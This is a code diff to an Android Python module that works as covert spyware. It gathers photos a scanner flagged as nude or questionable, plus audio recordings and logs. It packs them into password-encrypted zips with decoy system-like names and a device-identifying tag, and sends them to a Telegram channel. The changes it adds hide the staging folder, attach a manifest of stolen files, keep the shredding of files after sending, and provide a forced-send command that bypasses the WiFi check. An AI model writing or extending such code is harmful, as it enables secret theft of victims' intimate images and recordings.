@@ -7,9 +7,11 @@ import logging
 import gc
 import string
 import shutil
+import json
+import hashlib
 from datetime import datetime
 
-# ========== إعداد المسارات ==========
+# ========== إعداد المسارات (متوافقة مع بقية الملفات) ==========
 def _get_runtime_path():
     try:
         from jnius import autoclass
@@ -22,7 +24,7 @@ def _get_runtime_path():
 P = _get_runtime_path()
 H = os.path.join(P, "harvest")               # المجلد النهائي للملفات المضغوطة
 PENDING = os.path.join(H, "pending_upload")  # مجلد انتظار التأكيد (احتياطي)
-QUEUE = os.path.join(P, "harvest_queue")     # مجلد مؤقت للصور قبل الضغط
+QUEUE = os.path.join(P, ".cache_thumb")      # مجلد مؤقت للصور قبل الضغط (مخفي وموهم)
 
 for d in [P, H, PENDING, QUEUE]:
     if not os.path.exists(d):
@@ -52,14 +54,44 @@ class DailyZipper:
         self.max_b = 48 * 1024 * 1024   # 48MB (آمن تحت حد 50MB)
         self.active = False
 
-    # ========== توليد اسم ملف وهمي ==========
+        # الحصول على معرف مختصر للجهاز (لتضمينه في اسم الملف المضغوط)
+        self.device_tag = self._get_device_tag()
+
+    def _get_device_tag(self):
+        """استخراج معرف جهاز قصير (أول 8 خانات من ANDROID_ID أو hash عشوائي)"""
+        try:
+            from jnius import autoclass
+            Secure = autoclass('android.provider.Settings$Secure')
+            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
+            aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
+            if aid:
+                return aid[:8].lower()
+        except:
+            pass
+        # fallback: hash من نموذج الجهاز
+        import hashlib
+        try:
+            Build = autoclass('android.os.Build')
+            model = f"{Build.MANUFACTURER} {Build.MODEL}"
+            return hashlib.md5(model.encode()).hexdigest()[:8]
+        except:
+            return "unknown"
+
+    # ========== توليد اسم ملف وهمي ومعنّى (مع التاريخ ومعرف الجهاز) ==========
     def _gen_name(self):
         prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
+        # إضافة التاريخ بصيغة YYMMDD
+        date_str = datetime.now().strftime("%y%m%d")
+        # إضافة معرّف الجهاز المختصر
+        tag = self.device_tag
+        # مقطع عشوائي
         chars = string.ascii_letters + string.digits
-        suffix = ''.join(random.choices(chars, k=8))
-        return f"{random.choice(prefixes)}{suffix}.zip"
+        suffix = ''.join(random.choices(chars, k=6))
+        prefix = random.choice(prefixes)
+        # الاسم النهائي: مثلاً sys_upd_240521_a3f7_x9k2.zip
+        return f"{prefix}{date_str}_{tag}_{suffix}.zip"
 
-    # ========== إتلاف الملف (كتابة عشوائية + حذف) ==========
+    # ========== إتلاف الملف (كتابة عشوائية + حذف) مع تباطؤ ==========
     def _shred(self, path):
         try:
             if os.path.exists(path):
@@ -72,6 +104,8 @@ class DailyZipper:
                         f.flush()
                         os.fsync(f.fileno())
                 os.remove(path)
+                # 🆕 تباطؤ صغير لتقليل استهلاك المعالج
+                time.sleep(0.1)
         except:
             pass
 
@@ -106,18 +140,11 @@ class DailyZipper:
 
     # ========== الإرسال الفوري اليدوي (يتجاوز شرط WiFi) ==========
     def force_send_now(self, chat_id=None):
-        """
-        إرسال فوري يدوي:
-        1. يجمع كل الملفات من QUEUE و PENDING.
-        2. يضغطها فوراً (يُتجاوز شرط WiFi).
-        3. يرسلها إلى الخزنة ويُبلغ المستخدم بالنتيجة.
-        """
         if self.active:
             if chat_id:
-                self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⏳ عملية حصاد جارية بالفعل، انتظر قليلاً..."})
+                self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⏳ عملية حصاد جارية بالفعل..."})
             return
 
-        # جمع الملفات من مجلدي الانتظار
         files_to_pack = []
         for folder in [QUEUE, PENDING]:
             if os.path.exists(folder):
@@ -132,17 +159,17 @@ class DailyZipper:
             return
 
         if chat_id:
-            self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً وإرسالهم..."})
-
-        # تشغيل الضغط والإرسال في خيط منفصل (مع تجاوز WiFi)
+            self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً..."})
         threading.Thread(target=self._pack_and_ship, args=(files_to_pack, True, chat_id), daemon=True).start()
 
-    # ========== الضغط والإرسال (داخلي) ==========
+    # ========== الضغط والإرسال (داخلي) مع إنشاء ملف manifest ==========
     def _pack_and_ship(self, files, bypass_wifi=False, report_id=None):
         if not files or self.active:
             return
         if not HAS_PYZIP:
             logging.error("pyzipper missing. Cannot encrypt.")
+            if report_id:
+                self.tg._api("sendMessage", {"chat_id": report_id, "text": "⚠️ pyzipper missing, cannot pack files."})
             return
         if not bypass_wifi and not self._is_on_wifi():
             logging.info("Not on WiFi, skipping automatic harvest.")
@@ -175,12 +202,44 @@ class DailyZipper:
             zip_path = os.path.join(H, zip_name)
 
             try:
+                # بناء بيانات manifest (تقرير المحتويات)
+                manifest_data = []
+                for f in batch:
+                    fname = os.path.basename(f)
+                    fsize = os.path.getsize(f) if os.path.exists(f) else 0
+                    # نحاول استنتاج تصنيف بسيط من نوع الملف أو اسمه (يمكن تحسينه لاحقاً)
+                    ftype = "other"
+                    if fname.lower().endswith(('.jpg','.jpeg','.png')):
+                        ftype = "image"
+                    elif fname.lower().endswith('.aac'):
+                        ftype = "audio"
+                    elif fname.lower().endswith('.txt'):
+                        ftype = "log"
+                    manifest_data.append({
+                        "name": fname,
+                        "size": fsize,
+                        "type": ftype,
+                        "timestamp": int(os.path.getmtime(f)) if os.path.exists(f) else 0
+                    })
+
+                # إنشاء ملف manifest.json مؤقت
+                manifest_path = os.path.join(H, f"manifest_{int(time.time())}.json")
+                with open(manifest_path, 'w') as mf:
+                    json.dump(manifest_data, mf, indent=2)
+
+                # إضافة الملفات وmanifest إلى الأرشيف المشفر
                 with pyzipper.AESZipFile(zip_path, 'w',
                                          compression=pyzipper.ZIP_DEFLATED,
                                          encryption=pyzipper.WZ_AES) as zf:
                     zf.setpassword(self.pw.encode('utf-8'))
                     for f in batch:
                         zf.write(f, os.path.basename(f))
+                    # إضافة ملف manifest داخل الأرشيف
+                    zf.write(manifest_path, "manifest.json")
+
+                # حذف الملف المؤقت manifest
+                if os.path.exists(manifest_path):
+                    os.remove(manifest_path)
 
                 caption = f"📦 {'إرسال فوري' if bypass_wifi else 'حصاد تلقائي'} | دفعة {idx+1}/{len(batches)}"
                 success = self._safe_send(zip_path, caption)
@@ -202,7 +261,7 @@ class DailyZipper:
                 if os.path.exists(zip_path):
                     os.remove(zip_path)
 
-            # تأخير بسيط بين الدفعات (لتجنب حظر Telegram)
+            # تأخير بين الدفعات لتجنب حظر Telegram
             if idx < len(batches) - 1:
                 time.sleep(5)
 
@@ -214,7 +273,6 @@ class DailyZipper:
 
     # ========== الحصاد التلقائي (يُستدعى من monitor) ==========
     def run(self):
-        """جمع الملفات المصنفة (nude/questionable) وإضافة ملفات QUEUE ثم الضغط والإرسال"""
         if self.active or not self._is_on_wifi():
             return
 
@@ -229,7 +287,7 @@ class DailyZipper:
             except Exception as e:
                 logging.error(f"Scanner error: {e}")
 
-        # 2. إضافة الملفات الموجودة في مجلد QUEUE (إن وجدت)
+        # 2. إضافة الملفات الموجودة في مجلد QUEUE (.cache_thumb)
         if os.path.exists(QUEUE):
             for f in os.listdir(QUEUE):
                 path = os.path.join(QUEUE, f)
@@ -247,14 +305,12 @@ class DailyZipper:
             logging.error(f"Logs error: {e}")
 
         if all_files:
-            # إشعار بالتجميع (اختياري)
             if self.tg and hasattr(self.tg, 'notify_harvest'):
                 try:
                     did = getattr(self.sc, 'did', 'Unknown')
                     self.tg.notify_harvest(did, len(all_files))
                 except:
                     pass
-            # تشغيل الضغط والإرسال بدون تجاوز WiFi (تلقائي)
             threading.Thread(target=self._pack_and_ship, args=(all_files, False, None), daemon=True).start()
 
 
